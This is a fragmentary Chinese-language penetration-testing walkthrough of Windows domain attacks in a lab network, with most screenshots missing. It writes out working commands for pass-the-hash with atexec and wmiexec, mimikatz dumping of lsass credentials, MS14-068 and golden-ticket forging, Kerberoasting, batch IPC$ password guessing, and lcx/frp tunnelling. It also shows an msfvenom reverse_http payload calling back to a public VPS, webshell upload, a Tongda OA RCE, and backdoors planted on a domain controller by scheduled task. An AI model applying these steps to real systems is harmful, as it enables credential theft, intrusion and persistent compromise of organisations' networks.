...
![](assets/1630311910-5bbb2630dfc20f8bd2b72173907a52c0.png)  
Net view /domain 判断是否存在域  
确定域控的ip地址：  
net time /domain  
![](assets/1630311910-dae9dc3509f855a54f2aebeb1fbbac37.png)  
然后通过nslookup或ping确定其域控ip:  
![](assets/1630311910-28eed488ade5bd6840c8d6b9817fb6ec.png)  
确定当域内存活主机：  
...
![](assets/1630311910-6b5a0a24242d25886ddd0e25f3888a7a.png)  
把后门复制到域控c盘，at新建定时作业：  
![](assets/1630311910-f6cb22f3506e96a11ed8adc0c8bd5751.png)  
![](assets/1630311910-a66e5d4e802a3a913e68d572adf5b3dd.png)  
![](assets/1630311910-ed9ffca1d15d5e7de6a848b2f8964bf9.png)
...
![](assets/1630311910-ac99c37c9de55ef1af0b10026f00b44f.png)  
Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 test/administrator@192.168.202.148 “whoami”  
![](assets/1630311910-9f5f3cf0ae2a6e975cb6993033974dea.png)

## 2.3结合批处理利用：

已知密码和用户批量连接ip:  
FOR /F %%i in (ips.txt) do net use \\%%i\\ipc$ “password” /user:test\\administrator  
![](assets/1630311910-01204f4ecf6931b7232dd12783f8da78.png)  
已知用户和ip批量连接密码：  
...
![](assets/1630311910-9a01e0251b4ff86f5fcb22daf4645013.png)
...
![](assets/1630311910-3ae46694fa26126c5b14c3a282b54eb2.png)  
利用Mimikatzm相关命令获取dmp中的hash：  
Privilege::debug  
Sekurlsa::minidump lsass.dmp  
Sekurlsa::logonPasswords full  
![](assets/1630311910-8e163a4cf6bd4c9db8915a45561283f5.png)  
...
![](assets/1630311910-53a60167e8f42943feafb21ebc8b7a23.png)  
![](assets/1630311910-bd888d4438a2407c9943332b99898d3b.png)
...
![](assets/1630311910-441230fdedea3cc6aa10c95814f77dee.png)  
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 “whoami”  
![](assets/1630311910-e7404225c582ad541c7e8074678708e9.png)
...
![](assets/1630311910-33b113fd665dd112e141180bf61c706e.png)  
...
![](assets/1630311910-7ae382f54268063f6432f72f2299e482.png)
...
![](assets/1630311910-4442c4c60f8cd166f64edcac3ec177c0.png)  
Kerberos::purge或klist purge先清空当前机器中的所有凭证：  
![](assets/1630311910-56a69cdb9a3a3ddc669dba7ca499ebf4.png)  
利用MS14-068生成相应凭证：  
MS14-068.exe -u c@test.com -s S-1-5-21-2273191065-1635484360-3888421177-1105 -d 192.168.202.148 -p c@zxcvbnm123  
![](assets/1630311910-bb411d52f6b1e093d5097fd89445f482.png)  
使用mimikatz将票据注入内存：  
Kerberos::ptc “TGT\_c@test.com.ccache”  
![](assets/1630311910-19120307267f685441ca8d340bc07620.png)  
![](assets/1630311910-7dab8d07e21ced5b3fc93a07fe1d4c27.png)  
后续利用：  
![](assets/1630311910-5e2eb47e4b18725ed00a5898efdb0189.png)  
第二种kekeo利用hash生成票据：  
Kekeo “tgt::ask /user:c /domain:test.com /ntlm:abe09320f41c250eadcc5bfba77a5e1a”  
![](assets/1630311910-2ec562acbd1af58250f91cc3414d5211.png)  
同样清楚票据并导入生成的票据：  
kerberos::ptt TGT\_c@TEST.COM\_krbtgt~test.com@TEST.COM.kirbi  
![](assets/1630311910-37c001c08e0fadbfb556cf08032f124f.png)  
第三种利用mimikatz收集本地的票据并重新导入（导出需要管理员权限）：  
Sekurlsa::tickets /export  
![](assets/1630311910-5decec282597bb5dff9b96ccfdee0fb0.png)  
...
![](assets/1630311910-7dec8c61d29bbecbc2982ac5cd7e8264.png)  
获取域SID  
Wmic useraccount get name,sid  
S-1-5-21-2273191065-1635484360-3888421177-500  
![](assets/1630311910-573f9089b1e2f5125e385a20fc1b5a53.png)  
查询域管理员账户 net group “domain admins” /domain  
![](assets/1630311910-11a4369ab30a6fd98acc497235fa9868.png)  
获得域名 ipconfig /all  
![](assets/1630311910-b1894107142e476d03324cb1a692cd14.png)  
...
![](assets/1630311910-65b71453e5053090de6897168611f1b9.png)  
kerberos::ptt krbtgt.kiribi 把生成的票据重新导入内存  
![](assets/1630311910-bbbf5ae5be02d56e450addf018bd6618.png)  
![](assets/1630311910-4eebfb32c8d00f8bc61ede89816a719e.png)
...
![](assets/1630311910-604935ce33d186f944c1aaac7a9be742.png)  
退出mimikatz，查看内存中的票据：  
![](assets/1630311910-c312c4eac1857c4da0bd5097fb63753d.png)  
重新访问域控的共享目录：  
![](assets/1630311910-8dc4497980ded9fdc047e6c1aed036a8.png)
...
![](assets/1630311910-2e3521d54e01333fa3805137e1ede74c.png)  
查看注册的SPN  
Setspn -q _/_  
Setspn -q _/_ | findstr “MYSQL”  
![](assets/1630311910-be83786f7f03393406a6ba4f4b305238.png)  
请求服务票据  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/win7.xie.com:3306/MySQL"  
![](assets/1630311910-a635a5201a58ab8bd2e32ee56c9a53bc.png)  
列出服务票据  
Klist  
![](assets/1630311910-4ae70cc4f9d6117f95eeac76364bca71.png)  
并用mimikatz将票据导出  
Kerberos::list /export  
![](assets/1630311910-97bba960794e45235ff08cdc549f6c73.png)  
...
![](assets/1630311910-1548941d6af5a47aae1ce396a1cdeda2.png)  
...
![](assets/1630311910-84a6b7f9fec8893a0b0e0c90df42aea6.png)  
访问本地监听端口：  
![](assets/1630311910-de145a51cadba1bbce0ccb6f4b95bfee.png)
...
![](assets/1630311910-a83df105eeeb2734eaffbdd4dc4a5493.png)  
在受控端（即客户端）执行数据转发命令，将目标机器的80端口转发到公网vps的4444端口。  
Lcx.exe -slave 公网ip 4444 目标机器IP 80  
![](assets/1630311910-c57022b25945d2c7a3ecda25cf6a470c.png)  
我们通过vps的ip和5555访问到目标机器的80端口：  
![](assets/1630311910-aa75dcd338436f7967ef7781eeebe82a.png)
...
![](assets/1630311910-5fa5c8809bf97b162ce4b067c38899d1.png)  
访问对应的域名，确认能连接成功：  
![](assets/1630311910-095a2065690dd72e2d1c9148f00e9dc7.png)  
执行命令生成相应的exe：  
...
![](assets/1630311910-b39b0cc451bf0890b00ce991065138bc.png)

## 6.5 frp实现内网穿透

服务端默认监听端口是7000，执行命令，启动服务端 ./frps -c ./frps.ini  
![](assets/1630311910-f6ee255c99d5ca1a5b7cc8b97dd34ecf.png)  
![](assets/1630311910-e4f3565a9067a4162218d2717496eb35.png)  
启动客户端frpc配置文件:  
\[msf\]  
type = tcp  
local\_ip = 本地ip地址  
...
![](assets/1630311910-490bbb21ac64ca3b51da14311108fb61.png)  
服务端显示有客户端连接：  
![](assets/1630311910-ed488bcf387402b6d55f57bdaf2786f0.png)  
服务端开启6000端口进行监听  
![](assets/1630311910-f7124f1791bb7222893a55e9198d6cfd.png)  
Msf生成exe文件：  
msfvenom -p windows/meterpreter/reverse\_http lhost=公网ip lport=公网ip监听的端口 -f exe -o h4.exe  
执行exe上线：  
![](assets/1630311910-b97b2af0d67c8d9c2f139e96498c9318.png)
...
![](assets/1630311910-bf33f8328c4afcb2803c2397613734d1.png)  
...
![](assets/1630311910-8c57f5eb4b213a789c4fd2678ddf59a8.png)  
![](assets/1630311910-06679db73e458bd53d1e527352475535.png)  
3、使用系统自带ping(速度稍慢)  
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=”  
...
![](assets/1630311910-cbbaf2ea621e6980b4e9a82eaf056380.png)  
识别对应的端口  
...
![](assets/1630311910-88738e865c0acb3337270022c88cf32d.png)  
![](assets/1630311910-949543450e9fc82c11c59b4a36da34ee.png)  
使用xsltproc美化结果输出文档：  
xsltproc -o attck.html mode.xsl myAttackPorts.xml  
![](assets/1630311910-417d54f415cd9803408837e3fba3516a.png)
...
![](assets/1630311910-55cd27d3dda619099ec650f0a985b59d.png)

绑定域名，再对其www.moonlab.com进行目录爆破，  
![](assets/1630311910-e2929af477507adbe9ac1ee9c70f3e65.png)  
如果用kali自带的dirbuster工具会因为UA和速度等问题被拦截：  
![](assets/1630311910-828fa536eed236582440bd6749f438f1.png)  
![](assets/1630311910-cde8520f26bb0285da0135c7478bc01c.png)  
所以我们可以自己编写脚本进行目录的爆破，每间隔0.5秒进行请求操作：  
![](assets/1630311910-670c2478e3730fff6e3cc140d30cad95.png)  
![](assets/1630311910-09f533fc5836fe67ea830a0c473a2734.png)
...
![](assets/1630311910-b1f1e67cc86a0467003216d68a67613d.png)  
![](assets/1630311910-601c7fc49d2073491f6afd24dd24b0fe.png)  
![](assets/1630311910-c23454e01076552c34c69dab8a36c525.png)

然后我们根据网上所下载的原理分析出其登录时的密码加密流程：  
先看FrameworkLogin类的Submit\_Onclick()方法，流程很简单先判断验证码，然后把用户名和密码传入AdminManager.Authticate：  
![](assets/1630311910-dcb84eb36a83b9e6af6c5016f312580b.png)  
继续跟入AdminManager.Authticate，调用了AdministratorDAO.ValidateUser()验证：  
![](assets/1630311910-b35eca83ff36b21cef972baa8a118714.png)  
继续跟入AdministratorDAO.ValidateUser()的实现，函数先根据用户名找到用户的信息，根据数据库中用户的密码与输入的密码调用checkpassword()函数进行比对：  
![](assets/1630311910-2dffd139e67dd1b4e5af96e625a94fe0.png)  
把数据库中的密码和salt传入DecodePassword()进行相应的解密：  
![](assets/1630311910-9ec2b952f614797e7e8e5ad14a03caf9.png)  
DecodePassword()函数中调用的是系统库的des解密：  
![](assets/1630311910-c6c1c03ad8952c11cc3e29140870064a.png)  
![](assets/1630311910-84f342bb0cfe3b1d39bbebd2111fef71.png)  
我们了解了相关的解密流程，就可以自己编写相关的解密工具去解密前面注入得到的密码为admin5566。

我们使用密码登入后台，将一句话打包为zip并在站点模板里进行上传，并使用菜刀连接：  
![](assets/1630311910-95c98b91b6f251a8284b2334f62fddb1.png)  
![](assets/1630311910-1dfe052ee0a87537d8566c9b67917776.png)  
![](assets/1630311910-c0980d1460544a910cffd289e53eef3e.png)
...
![](assets/1630311910-f4a5d58799d9fbde7fedb3acd9e118b6.png)  
...
![](assets/1630311910-77a974b58013d75b4ef8ff86021666d5.png)  
因为目标机器是windows server 2016获取不到明文密码，我们使用msf中自带模块run post/windows/gather/smart\_hashdump，把hash dump出来  
![](assets/1630311910-b8cba9711dd7cafbf48c9b194863b365.png)  
...
![](assets/1630311910-f418b49cef899a3cf81328e300454f3e.png)  
先进行内网中得主机发现，使用msf自带得arp：run arp\_scanner -r 10.10.1.0/24  
![](assets/1630311910-543f0db77bcf3c8d11cf2525c5382a37.png)  
Msf添加路由，run autoroute -s 10.10.1.0/24  
![](assets/1630311910-bcdb1fc1803c2412e37d7b6f403ce287.png)  
对所发现的IP进行端口扫描：proxychains nmap -sC -A 10.10.1.130 -p 80,53,1433,49154,6588,3389,135,21,51464,999，可见只有80端口是开放得：  
![](assets/1630311910-ac8bd3b2ceb689b8d15b527c8d26ec24.png)  
通过访问80端口得知是通达oa尝试使用其RCE漏洞，先用蚁剑生成php小马再利用RCE exp脚本进行攻击：  
![](assets/1630311910-217fd3f0b99abf801b47974166d7c3b7.png)  
连接小马，当前权限为system:  
![](assets/1630311910-2793c56058dde29d8fc0446254cdb70a.png)
...
![](assets/1630311910-5ddcfdf1ec5c9a035d8e8b65cb027d76.png)
...
set lport 13777  
![](assets/1630311910-d96d9d57bb45dd004df357097a1f5398.png)  
查看当前主机存在哪些网段run get\_local\_subnets:  
![](assets/1630311910-96dc8ef1032c21c0dd9e345759b6cb48.png)  
Migrate 迁移进程后，load kiwi加载mimiatz，kiwi\_cmd sekurlsa::logonpasswords尝试使用其获取hash：357bec0ee1f524c62ba536fcd3f74472  
![](assets/1630311910-6dec7535a0596c00ffc78d407a801ca5.png)  
执行sysinfo，可见该主机存在域中：  
![](assets/1630311910-5de9cb002889ada8326b9df1ae58b0e2.png)  
使用net time定位域控：  
Chcp 65001设置乱码  
![](assets/1630311910-0f8fc87e59fa344594486d850be343cf.png)  
使用msf自带模块定位域控run post/windows/gather/enum\_domain，得到域控ip：  
![](assets/1630311910-1bb4428ebb2e4b383d56e86e2a6a4d29.png)  
使用msf自带模块判断该主机是否有域管登录过，run post/windows/gather/enum\_logged\_on\_users：  
![](assets/1630311910-5527870f869c88101b1eac2d0edc9b3d.png)  
...
![](assets/1630311910-7f837085d4db9d42c0c13292b4a530ae.png)  
![](assets/1630311910-762f327ee691463f780597cd29fce2dd.png)  
![](assets/1630311910-90a495e07496de8cce185bc33fac016c.png)  
添加路由后，我们使用nmap对域控ip进行扫描proxychains nmap -sC -A 10.10.10.165 -p 80,53,445,1433,49154,6588,3389,135,21,51464,999：  
![](assets/1630311910-11a711d98a3eb200c25144a0ebfe2d19.png)  
![](assets/1630311910-07fed5d5c5e400f13e385ec8ed60c195.png)  
开放了445端口，我们可以利用获得得hash：357bec0ee1f524c62ba536fcd3f74472进行pth传递：  
![](assets/1630311910-af6a55d83503679ea7733f0a6da8a0c1.png)  
...
![](assets/1630311910-88141516425d56143d398872d6b8d2ca.png)  
...
![](assets/1630311910-38e037299230a57d53aa3559660a57d8.png)  
![](assets/1630311910-60105d195a6eb464d39680d908bc45f3.png)  
使用copy命名把后门复制到域控中：  
![](assets/1630311910-8b83eed729e3777f7d7ec1fb50f66548.png)  
使用如下命令  
...
创建计划任务，执行相关后门：  
![](assets/1630311910-8f26536f314eb6e8cc2a19062cf9ef23.png)  
![](assets/1630311910-ea5a54543dbf7c85aa37eb97d636d822.png)
